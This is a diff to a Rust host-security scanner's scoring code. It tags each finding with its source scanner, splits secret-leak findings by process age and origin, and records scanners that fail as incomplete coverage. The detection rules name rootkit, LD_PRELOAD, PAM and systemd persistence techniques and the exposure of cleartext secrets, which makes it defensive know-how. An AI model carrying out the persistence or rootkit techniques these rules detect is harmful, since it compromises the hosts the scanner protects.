         if !inv.hidden_candidates.is_empty() {
@@ -1395,6 +1410,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-040",
+                source: Scanner::Security,
                 title: "ACTIVE COMPROMISE: kernel module hidden from /proc/modules".to_string(),
                 category: Category::Security,
                 weight: 55,
@@ -1410,10 +1426,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-041 – Unexplained ftrace hook on a syscall entry (rootkit) ─────
-    // Deliberately NOT an independent IoC: legit EDR modules hook syscalls via
-    // ftrace, and the genuinely-malicious case (callback in a HIDDEN module)
-    // already trips SEC-040 → exit-3. Here we add weight/detail via correlation.
     {
         let inv = &report.security.ftrace_hooks;
         if !inv.live_tracer_active && !inv.unattributed_syscall_hooks.is_empty() {
@@ -1449,6 +1461,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             if !correlated.is_empty() {
                 findings.push(Finding {
                     id: "SEC-041",
+                    source: Scanner::Security,
                     title: "ACTIVE COMPROMISE: syscall ftrace-hooked by a hidden module"
                         .to_string(),
                     category: Category::Security,
@@ -1465,6 +1478,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             } else if inv.attribution_degraded && !module_backed {
                 findings.push(Finding {
                     id: "SEC-041",
+                    source: Scanner::Security,
                     title: "Unattributed ftrace hooks on syscalls (attribution degraded)".to_string(),
                     category: Category::Security,
                     weight: 0,
@@ -1485,6 +1499,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             } else {
                 findings.push(Finding {
                     id: "SEC-041",
+                    source: Scanner::Security,
                     title: "Unexplained ftrace hook on a syscall entry point".to_string(),
                     category: Category::Security,
                     weight: 30,
@@ -1501,8 +1516,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-042 / SEC-049 / SEC-050: System-wide LD_PRELOAD ──
-    // R23-26: one finding per tier – score must not inflate with number of lines.
     {
         let mut pre_volatile: Vec<String> = Vec::new();
         let mut pre_unverifiable: Vec<String> = Vec::new();
@@ -1526,13 +1539,13 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             }
         }
 
-        // Volatile or corroborated → SEC-042 (weight 60 if any volatile, else 55)
         if !pre_volatile.is_empty() || !pre_mapped.is_empty() {
             let weight = if !pre_volatile.is_empty() { 60 } else { 55 };
             let mut entries = pre_volatile;
             entries.append(&mut pre_mapped);
             findings.push(Finding {
                 id: "SEC-042",
+                source: Scanner::Persistence,
                 title: "ACTIVE COMPROMISE: system-wide LD_PRELOAD injected".into(),
                 category: Category::Security,
                 weight,
@@ -1546,10 +1559,10 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Unpackaged but not corroborated → SEC-050
         if !pre_unmapped.is_empty() {
             findings.push(Finding {
                 id: "SEC-050",
+                source: Scanner::Persistence,
                 title: "System-wide LD_PRELOAD injected (unpackaged, not yet mapped)".into(),
                 category: Category::Security,
                 weight: 30,
@@ -1563,10 +1576,10 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Ownership unverifiable → SEC-049
         if !pre_unverifiable.is_empty() {
             findings.push(Finding {
                 id: "SEC-049",
+                source: Scanner::Persistence,
                 title: "System-wide LD_PRELOAD present (ownership unverifiable)".into(),
                 category: Category::Security,
                 weight: 20,
@@ -1581,7 +1594,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-051 – ld.so.conf.d library path injection ──
     if !report.security.ld_so_conf_injections.is_empty() {
         let list: Vec<String> = report
             .security
@@ -1599,6 +1611,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .collect();
         findings.push(Finding {
             id: "SEC-051",
+            source: Scanner::Persistence,
             title: "ld.so.conf paths allow unprivileged library injection".into(),
             category: Category::Security,
             weight: 30,
@@ -1608,7 +1621,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-052 / SEC-053 / SEC-054: systemd generator persistence ──
     #[cfg(feature = "local-scan")]
     {
         use crate::scanners::generators::{
@@ -1637,6 +1649,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !ioc.is_empty() {
             findings.push(Finding {
                 id: "SEC-052",
+                source: Scanner::Persistence,
                 title: "ACTIVE COMPROMISE: systemd generator controlled by a non-root principal"
                     .to_string(),
                 category: Category::Security,
@@ -1654,6 +1667,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !unpackaged.is_empty() {
             findings.push(Finding {
                 id: "SEC-053",
+                source: Scanner::Persistence,
                 title: "Unpackaged systemd generator outside the vendor hierarchy".to_string(),
                 category: Category::Security,
                 weight: 30,
@@ -1670,6 +1684,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !unverifiable.is_empty() {
             findings.push(Finding {
                 id: "SEC-054",
+                source: Scanner::Persistence,
                 title: "systemd generator present (origin or target unverifiable)".to_string(),
                 category: Category::Security,
                 weight: 20,
@@ -1685,7 +1700,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-055 / SEC-056 / SEC-057 / SEC-058: PAM stack injection ────────
     {
         use crate::models::{ExecWritability, PamTargetKind};
         let (mut ioc, mut unpackaged, mut unverifiable) = (Vec::new(), Vec::new(), Vec::new());
@@ -1718,7 +1732,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 )
             };
 
-            // SEC-058: config slot itself is writable → immediate IoC
             if f.target_kind == PamTargetKind::Config && f.writability != ExecWritability::RootOnly
             {
                 ioc.push(evidence);
@@ -1728,7 +1741,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             match f.writability {
                 ExecWritability::NonRootWritable => ioc.push(evidence),
                 ExecWritability::Missing if f.parent_takeable => ioc.push(evidence),
-                ExecWritability::Missing => {} // stale config line
+                ExecWritability::Missing => {}
                 ExecWritability::Unknown => unverifiable.push(evidence),
                 _ => {
                     if f.volatile {
@@ -1743,6 +1756,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !ioc.is_empty() {
             findings.push(Finding {
                 id: "SEC-055",
+                source: Scanner::Persistence,
                 title: "ACTIVE COMPROMISE: PAM module/config writable or volatile (authentication bypass)"
                     .to_string(),
                 category: Category::Security,
@@ -1755,6 +1769,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !unpackaged.is_empty() {
             findings.push(Finding {
                 id: "SEC-056",
+                source: Scanner::Persistence,
                 title: "Unpackaged PAM module outside trusted directories".to_string(),
                 category: Category::Security,
                 weight: 30,
@@ -1770,6 +1785,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !unverifiable.is_empty() {
             findings.push(Finding {
                 id: "SEC-057",
+                source: Scanner::Persistence,
                 title: "PAM module present (ownership unverifiable)".to_string(),
                 category: Category::Security,
                 weight: 20,
@@ -1784,12 +1800,10 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-043 / SEC-045 / SEC-046 / SEC-047 / SEC-048 – ExecStart provenance ──
     {
         use crate::models::ExecWritability as W;
         let inj = &report.security.exec_start_injections;
 
-        // Helper: collect evidence strings for findings matching a predicate
         let sel = |p: &dyn Fn(&crate::models::ExecStartFinding) -> bool| -> Vec<String> {
             inj.iter()
                 .filter(|f| p(f))
@@ -1797,8 +1811,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .collect()
         };
 
-        // Tier 1 — live rogue payload on tmpfs, declared by a non‑vendor unit.
-        // Unknown writability is excluded: an EACCES target is not provably present.
         let live_rogue = sel(&|f| {
             f.volatile
                 && matches!(f.writability, W::RootOnly | W::NonRootWritable)
@@ -1807,6 +1819,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !live_rogue.is_empty() {
             findings.push(Finding {
                 id: "SEC-043",
+                source: Scanner::Persistence,
                 title: "ACTIVE COMPROMISE: unpackaged unit executes a live target on tmpfs".into(),
                 category: Category::Security,
                 weight: 55,
@@ -1821,7 +1834,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Tier 2 — live vendor unit on tmpfs (e.g. LXD agent, cloud-init)
         let live_vendor = sel(&|f| {
             f.volatile
                 && matches!(f.writability, W::RootOnly | W::NonRootWritable)
@@ -1830,6 +1842,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !live_vendor.is_empty() {
             findings.push(Finding {
                 id: "SEC-047",
+                source: Scanner::Persistence,
                 title: "Vendor unit executes from a runtime-provisioned path".into(),
                 category: Category::Security,
                 weight: 0,
@@ -1848,7 +1861,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Tier 3 — volatile target that does not exist (dormant)
         let dormant: Vec<&crate::models::ExecStartFinding> = inj
             .iter()
             .filter(|f| f.volatile && f.writability == W::Missing)
@@ -1862,6 +1874,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .collect::<Vec<_>>();
             findings.push(Finding {
                 id: "SEC-048",
+                source: Scanner::Persistence,
                 title: "Unit references a volatile path that does not exist".into(),
                 category: Category::Security,
                 weight: if rogue { 20 } else { 0 },
@@ -1881,12 +1894,11 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Privilege — weighted regardless of packaging
-        // R23-06: only flag when the unit actually runs as root.
         let weak = sel(&|f| f.runs_as_root && !f.volatile && f.writability == W::NonRootWritable);
         if !weak.is_empty() {
             findings.push(Finding {
                 id: "SEC-046",
+                source: Scanner::Persistence,
                 title: "Root-executed unit/cron target is writable by a non-root principal".into(),
                 category: Category::Security,
                 weight: 25,
@@ -1901,21 +1913,14 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Unknown writability — coverage only
-        let unknown = inj.iter().filter(|f| f.writability == W::Unknown).count();
-        if unknown > 0 {
-            coverage::record(format!(
-                "exec_provenance: {unknown} target(s) could not be stat'ed (EACCES) — \
-                 writability UNVERIFIED, not assumed safe"
-            ));
-        }
-
-        // Inventory: unpackaged but root-only
+        // Side effect removed; moved to warn_evaluate_side_effects.
+        // Only forming finding SEC-045 here.
         let unpackaged =
             sel(&|f| !f.volatile && f.writability == W::RootOnly && f.package.is_none());
         if !unpackaged.is_empty() {
             findings.push(Finding {
                 id: "SEC-045",
+                source: Scanner::Persistence,
                 title: "Unit/cron targets with no package owner (inventory)".into(),
                 category: Category::Security,
                 weight: 0,
@@ -1937,14 +1942,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-044 – Kernel security facts (core_pattern, lockdown) ──────────
-    // R23-07: core_pattern is now Option — None means unreadable (coverage).
-    // Uses shared core_pattern_is_trusted() so policy stays in one place.
     if let Some(cp) = report.security.core_pattern.as_deref()
         && !core_pattern_is_trusted(cp)
     {
         findings.push(Finding {
             id: "SEC-044",
+            source: Scanner::Persistence,
             title: "Suspicious core_pattern (piped to unknown handler)".to_string(),
             category: Category::Security,
             weight: 25,
@@ -1959,6 +1962,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     {
         findings.push(Finding {
             id: "SEC-044",
+            source: Scanner::Persistence,
             title: "Kernel lockdown is inactive".to_string(),
             category: Category::Security,
             weight: 0,
@@ -1972,7 +1976,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SEC-027 – JIT Advisory
     if !jit_advisories.is_empty() {
         let mut by_process = std::collections::HashMap::new();
         for adv in &jit_advisories {
@@ -1988,6 +1991,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-027",
+            source: Scanner::Security,
             title: "Writable JIT code cache — hardening opportunity".to_string(),
             category: Category::Security,
             weight: 0,
@@ -2004,7 +2008,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-024 – True Ghost PID (LKM rootkit process hiding) ─
     if !report.security.ghost_pids.is_empty() {
         let describe = |g: &crate::models::GhostPidFinding| {
             let st = g.state.as_deref().unwrap_or("?");
@@ -2033,6 +2036,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-024",
+                source: Scanner::Security,
                 title: "ACTIVE COMPROMISE: Hidden process (LKM rootkit) detected".to_string(),
                 category: Category::Security,
                 weight: 60,
@@ -2054,6 +2058,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-025",
+                source: Scanner::Security,
                 title: "Suspicious transient PID visibility mismatch".to_string(),
                 category: Category::Security,
                 weight: 20,
@@ -2068,7 +2073,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-018 – Malicious cron job detected ────────────────
     if let Some(_critical) = report
         .host
         .cron_jobs
@@ -2085,6 +2089,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-018",
+            source: Scanner::Host,
             title: "Suspicious cron job detected (possible persistence)".to_string(),
             category: Category::Security,
             weight: 20,
@@ -2098,39 +2103,107 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── DLP & Secret Hygiene ───────────────────────────────
-    if !report.security.secret_hygiene.is_empty() {
-        let mut evidence_list = Vec::new();
-        for leak in report.security.secret_hygiene.iter().take(3) {
-            evidence_list.push(format!(
-                "'{}' in {} of {} (pid {})",
-                leak.matched_key, leak.source, leak.process, leak.pid
-            ));
-        }
-        let mut evidence_str = evidence_list.join(", ");
-        if report.security.secret_hygiene.len() > 3 {
-            evidence_str.push_str(&format!(
-                " and {} more...",
-                report.security.secret_hygiene.len() - 3
-            ));
+    // R27-25: secrets found in the scanner's own environment are a hygiene
+    // issue of the scanner, not of the host. Never hidden (Raw Truth), but
+    // never weighted against the host.
+    let (self_leaks, host_leaks): (Vec<_>, Vec<_>) = report
+        .security
+        .secret_hygiene
+        .iter()
+        .partition(|l| l.self_attributed.is_some());
+
+    if !host_leaks.is_empty() {
+        // Split by process age: secrets in very short-lived processes are
+        // likely transient and should not carry the full SEC-014 weight.
+        let (short_lived, long_lived): (
+            Vec<&crate::models::SecretLeak>,
+            Vec<&crate::models::SecretLeak>,
+        ) = host_leaks
+            .into_iter()
+            .partition(|l| l.age_secs.is_some_and(|a| a < DLP_SHORT_LIVED_AGE_SECS));
+
+        if !long_lived.is_empty() {
+            let mut evidence_list = Vec::new();
+            for leak in long_lived.iter().take(3) {
+                evidence_list.push(format!(
+                    "'{}' in {} of {} (pid {})",
+                    leak.matched_key, leak.source, leak.process, leak.pid
+                ));
+            }
+            let mut evidence_str = evidence_list.join(", ");
+            if long_lived.len() > 3 {
+                evidence_str.push_str(&format!(" and {} more...", long_lived.len() - 3));
+            }
+
+            findings.push(Finding {
+                id: "SEC-014",
+                source: Scanner::Security,
+                title: "Cleartext secrets exposed in process memory".to_string(),
+                category: Category::Security,
+                weight: 25,
+                evidence: format!("Found {} leak(s): {}", long_lived.len(), evidence_str),
+                suppressed: None,
+                cis_ref: None,
+            });
         }
 
+        // Short-lived secrets are informational only, never weighted.
+        if !short_lived.is_empty() {
+            let mut evidence_list = Vec::new();
+            for leak in short_lived.iter().take(3) {
+                evidence_list.push(format!(
+                    "'{}' in {} of {} (pid {})",
+                    leak.matched_key, leak.source, leak.process, leak.pid
+                ));
+            }
+            let mut evidence_str = evidence_list.join(", ");
+            if short_lived.len() > 3 {
+                evidence_str.push_str(&format!(" and {} more...", short_lived.len() - 3));
+            }
+
+            findings.push(Finding {
+                id: "SEC-059",
+                source: Scanner::Security,
+                title: "Cleartext secrets in short-lived processes (informational)".to_string(),
+                category: Category::Security,
+                weight: 0,
+                evidence: format!(
+                    "Found {} leak(s) in process(es) younger than {DLP_SHORT_LIVED_AGE_SECS}s: {}",
+                    short_lived.len(),
+                    evidence_str
+                ),
+                suppressed: Some(
+                    "Short-lived process secrets are unlikely to be exploited; surfacing for Raw Truth only."
+                        .to_string(),
+                ),
+                cis_ref: None,
+            });
+        }
+    }
+
+    if !self_leaks.is_empty() {
         findings.push(Finding {
-            id: "SEC-014",
-            title: "Cleartext secrets exposed in process memory".to_string(),
+            id: "SEC-058",
+            source: Scanner::Security,
+            title: "Scanner's own process carries a secret in its environment".to_string(),
             category: Category::Security,
-            weight: 25,
+            weight: 0, // informational only
             evidence: format!(
-                "Found {} leak(s): {}",
-                report.security.secret_hygiene.len(),
-                evidence_str
+                "{} key(s) in owlzops-mapper's own environ/cmdline: {}. The startup \
+                 scrub (R27-13) only removes OWLZOPS_SUDO_PASS; anything else was \
+                 inherited from the invoking shell.",
+                self_leaks.len(),
+                self_leaks
+                    .iter()
+                    .map(|l| l.matched_key.as_str())
+                    .collect::<Vec<_>>()
+                    .join(", ")
             ),
             suppressed: None,
             cis_ref: None,
         });
     }
 
-    // ── Non-root processes with critical kernel capabilities (CAP-001) ──
     let cap_findings: Vec<&crate::models::ProcCapFinding> = report
         .security
         .capability_audit
@@ -2185,6 +2258,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "CAP-001",
+            source: Scanner::Security,
             title: "Non-root processes hold critical kernel capabilities".to_string(),
             category: Category::Security,
             weight,
@@ -2194,7 +2268,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── CAP-002 – ambient capabilities without NoNewPrivs (non-root) ──────
     let ambient_findings: Vec<&crate::models::ProcCapFinding> = report
         .security
         .capability_audit
@@ -2219,7 +2292,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .into_iter()
             .partition(|f| ambient_escalation_weight(f.ambient) > 0);
 
-        // Weighted: at least one escalation-primitive cap held ambiently.
         if !active.is_empty() {
             let max_weight = active
                 .iter()
@@ -2233,6 +2305,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "CAP-002",
+                source: Scanner::Security,
                 title: "Escalation-capable ambient capabilities with NoNewPrivs disabled"
                     .to_string(),
                 category: Category::Security,
@@ -2248,7 +2321,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Informational: only benign ambient caps (IPC_LOCK, SYS_TIME, …).
         if !benign.is_empty() {
             let list = benign
                 .iter()
@@ -2257,6 +2329,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "CAP-002",
+                source: Scanner::Security,
                 title: "Benign ambient capabilities (informational)".to_string(),
                 category: Category::Security,
                 weight: 0,
@@ -2276,7 +2349,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── Docker container security issues ────────────────
     let mut has_mem_limit_issue = false;
     let mut has_cpu_limit_issue = false;
     let mut has_privileged = false;
@@ -2298,6 +2370,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_mem_limit_issue {
         findings.push(Finding {
             id: "DOCK-001",
+            source: Scanner::Docker,
             title: "Docker containers without memory limits".to_string(),
             category: Category::Security,
             weight: 5,
@@ -2309,6 +2382,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_cpu_limit_issue {
         findings.push(Finding {
             id: "DOCK-002",
+            source: Scanner::Docker,
             title: "Docker containers without CPU limits".to_string(),
             category: Category::Security,
             weight: 3,
@@ -2320,6 +2394,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_privileged {
         findings.push(Finding {
             id: "DOCK-003",
+            source: Scanner::Docker,
             title: "Privileged Docker containers detected".to_string(),
             category: Category::Security,
             weight: 10,
@@ -2331,6 +2406,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_dangerous_caps {
         findings.push(Finding {
             id: "DOCK-004",
+            source: Scanner::Docker,
             title: "Docker containers with dangerous capabilities".to_string(),
             category: Category::Security,
             weight: 10,
@@ -2342,7 +2418,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── DOCK-010 — runtime capability ground truth (container escape) ──
     let mut tampered: Vec<String> = Vec::new();
     for c in &report.topology.containers {
         if c.privileged {
@@ -2363,6 +2438,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if !tampered.is_empty() {
         findings.push(Finding {
             id: "DOCK-010",
+            source: Scanner::Docker,
             title: "ACTIVE COMPROMISE: container runtime capabilities exceed declared config"
                 .to_string(),
             category: Category::Security,
@@ -2377,7 +2453,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── Sensitive host mounts (Docker breakout surface) ──
     let mut has_socket_or_root = false;
     let mut has_sensitive_rw = false;
 
@@ -2394,6 +2469,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_socket_or_root {
         findings.push(Finding {
             id: "DOCK-005",
+            source: Scanner::Docker,
             title: "Container mounts runtime control socket or host root".to_string(),
             category: Category::Security,
             weight: 15,
@@ -2412,6 +2488,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if has_sensitive_rw {
         findings.push(Finding {
             id: "DOCK-006",
+            source: Scanner::Docker,
             title: "Container mounts sensitive host path (writable)".to_string(),
             category: Category::Security,
             weight: 10,
@@ -2422,7 +2499,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── Docker reliability ───────────────────────────────
     let mut oom_names: Vec<&str> = Vec::new();
     let mut loop_names: Vec<&str> = Vec::new();
     let mut unhealthy_names: Vec<&str> = Vec::new();
@@ -2444,6 +2520,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         let list = oom_names.join(", ");
         findings.push(Finding {
             id: "DOCK-007",
+            source: Scanner::Docker,
             title: "Containers killed by OOM".to_string(),
             category: Category::Reliability,
             weight: RISK_CONTAINER_OOM,
@@ -2457,6 +2534,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         let list = loop_names.join(", ");
         findings.push(Finding {
             id: "DOCK-008",
+            source: Scanner::Docker,
             title: "Containers in restart loop".to_string(),
             category: Category::Reliability,
             weight: RISK_CONTAINER_RESTART_LOOP,
@@ -2473,6 +2551,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         let list = unhealthy_names.join(", ");
         findings.push(Finding {
             id: "DOCK-009",
+            source: Scanner::Docker,
             title: "Unhealthy containers (failing healthcheck)".to_string(),
             category: Category::Reliability,
             weight: RISK_CONTAINER_UNHEALTHY,
@@ -2482,8 +2561,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── Reliability ─────────────────────────────────────
-
     if report
         .host
         .failed_services
@@ -2492,6 +2569,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     {
         findings.push(Finding {
             id: "REL-001",
+            source: Scanner::Host,
             title: "Failed systemd services".to_string(),
             category: Category::Reliability,
             weight: RISK_FAILED_SERVICES,
@@ -2504,6 +2582,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if report.host.backup_tools.is_empty() {
         findings.push(Finding {
             id: "REL-002",
+            source: Scanner::Host,
             title: "No backup tools detected".to_string(),
             category: Category::Reliability,
             weight: RISK_NO_BACKUP,
@@ -2516,6 +2595,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if report.host.oom_kills > 0 {
         findings.push(Finding {
             id: "REL-003",
+            source: Scanner::Host,
             title: "OOM kills present".to_string(),
             category: Category::Reliability,
             weight: RISK_OOM_KILLS,
@@ -2525,17 +2605,38 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── Hygiene ─────────────────────────────────────────
-
     if !report.host.ntp_synchronized {
         findings.push(Finding {
             id: "HYG-001",
+            source: Scanner::Host,
             title: "NTP not synchronized".to_string(),
             category: Category::Hygiene,
             weight: RISK_NTP_NOT_SYNCED,
             evidence: "Time not synchronized".to_string(),
             suppressed: None,
             cis_ref: Some("CIS 2.2.1.1"),
+        });
+    }
+
+    // R24-92: remove findings that come from scanners which panicked.
+    // A panic means Default values, not observations.
+    findings.retain(|f| !finding_from_failed_scanner(f, report));
+
+    // R25-26: a failed scanner means the surfaces it owned were never observed.
+    // Record that fact in the findings; verdict is Incomplete, not clean.
+    for scanner in &report.failed_scanners {
+        findings.push(Finding {
+            id: "COV-001",
+            source: Scanner::Orchestrator,
+            title: "Scanner panicked; verdict incomplete".to_string(),
+            category: Category::Hygiene,
+            weight: 0,
+            evidence: format!(
+                "scanner `{scanner}` panicked; findings derived from it were withheld — \
+                 this host's verdict is INCOMPLETE, not clean"
+            ),
+            suppressed: None,
+            cis_ref: None,
         });
     }
 
@@ -2551,6 +2652,83 @@ pub struct ScoredReport {
     pub reliability: u8,
     pub hygiene: u8,
     pub findings: Vec<Finding>,
+}
+
+/// The security axis alone: what the scan FOUND.
+/// Completeness — what the scan could SEE — lives in `Coverage` and is never
+/// collapsed into this value: a host whose scanner panicked can still hold a
+/// confirmed Critical, and folding the two axes into one enum hid it
+/// (R25-44/R25-74).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum SecurityVerdict {
+    Clean,
+    Critical,
+    Compromised,
+}
+
+impl SecurityVerdict {
+    /// Explicit, not `derive(Ord)`: with a derive, reordering the declaration
+    /// silently changes fleet aggregation and nothing fails to compile.
+    fn rank(self) -> u8 {
+        match self {
+            Self::Clean => 0,
+            Self::Critical => 1,
+            Self::Compromised => 2,
+        }
+    }
+
+    pub fn worse(self, other: Self) -> Self {
+        if self.rank() >= other.rank() {
+            self
+        } else {
+            other
+        }
+    }
+}
+
+pub fn security_verdict_from_findings(findings: &[Finding]) -> SecurityVerdict {
+    let flags = CriticalFlags::from_findings(findings);
+    if flags.compromised_host {
+        SecurityVerdict::Compromised
+    } else if flags.has_critical() {
+        SecurityVerdict::Critical
+    } else {
+        SecurityVerdict::Clean
+    }
+}
+
+/// Fail-open guard for the R24-92 filter, previously inside
+/// `verdict_from_findings` (R25-46/R25-59). Called once per report.
+pub fn warn_unmapped_scanners(failed_scanners: &[String]) {
+    for name in failed_scanners {
+        if Scanner::from_name(name).is_none() {
+            coverage::record(format!(
+                "scoring: failed scanner `{name}` has no Scanner variant — findings \
+                 derived from it were NOT withheld from the verdict"
+            ));
+        }
+    }
+}
+
+/// Emit coverage warnings for facts discovered during `evaluate` that are not
+/// findings but still reduce confidence. Extracted out so `evaluate` remains a
+/// pure function and the side effect happens exactly once per report
+/// (R25-95).
+// macOS / --no-default-features builds without `local-scan` compile this out of
+// production and see only the call site under `cfg(feature = "local-scan")`.
+#[cfg_attr(not(feature = "local-scan"), allow(dead_code))]
+pub fn warn_evaluate_side_effects(exec_start_injections: &[crate::models::ExecStartFinding]) {
+    let unknown = exec_start_injections
+        .iter()
+        .filter(|f| f.writability == crate::models::ExecWritability::Unknown)
+        .count();
+
+    if unknown > 0 {
+        coverage::record(format!(
+            "exec_provenance: {unknown} target(s) could not be stat'ed (EACCES) — \
+             writability UNVERIFIED, not assumed safe"
+        ));
+    }
 }
 
 #[allow(dead_code)]
@@ -2591,12 +2769,11 @@ pub struct CriticalFlags {
     pub sudo_nopasswd: bool,
     pub ntp_not_synced: bool,
     pub sysctl_issues_count: usize,
-    /// At least one active-compromise (IoC) finding fired. Orthogonal to the
-    /// hygiene flags above; drives a distinct exit code in main.rs.
     pub compromised_host: bool,
 }
 
 impl CriticalFlags {
+    #[allow(dead_code)] // used by tests; main binary now uses security_verdict_from_findings
     pub fn from_report(report: &AgentReport) -> Self {
         let findings = evaluate(report);
         Self::from_findings(&findings)
@@ -2608,24 +2785,12 @@ impl CriticalFlags {
                 .iter()
                 .any(|f| f.id == id && f.suppressed.is_none())
         };
-        // Active-compromise (IoC) finding IDs. SEC-018 is deliberately excluded:
-        // it is cron-persistence suspicion (weight 20), not a confirmed live IoC.
-        // SEC-025 is likewise excluded: it is a downgraded ghost-PID suspicion
-        // (young/racy/unconfirmable), not a confirmed hidden process.
-        // SEC-026 is excluded: suspicious memory mappings (anon/rwx) are not
-        // confirmed active compromise, but may indicate JIT or driver activity.
-        // SEC-028 is included: deep-confirmed unattributed payload = live IoC.
-        // SEC-040 is included: a module live in sysfs/kallsyms but hidden from
-        // /proc/modules is a Diamorphine-class rootkit. Built-ins and pseudo-
-        // modules are excluded upstream, so FP is near-zero.
         const IOC_IDS: [&str; 16] = [
             "SEC-015", "SEC-016", "SEC-017", "SEC-019", "SEC-020", "SEC-021", "SEC-022", "SEC-023",
             "SEC-024", "SEC-028", "SEC-040", "DOCK-010", "SEC-042", "SEC-043", "SEC-052",
             "SEC-055",
         ];
 
-        // R23-14: IOC_IDS finding must carry IoC-band weight. Mixing tiers
-        // under one ID is the source of exit-3 at weight 20/30 (see R23-02).
         debug_assert!(
             findings.iter().all(|f| {
                 !(IOC_IDS.contains(&f.id) && f.suppressed.is_none()) || f.weight >= 55
@@ -2664,10 +2829,6 @@ impl CriticalFlags {
             || self.sysctl_issues_count >= SYSCTL_CRITICAL_THRESHOLD
     }
 
-    /// True when at least one active-compromise (IoC) finding fired. Orthogonal
-    /// to `has_critical()`: a host can be compromised with no standard hygiene
-    /// critical, and vice-versa. main.rs maps this to a distinct exit code so
-    /// CI/CD can page (compromise) separately from failing the build (critical).
     #[allow(dead_code)]
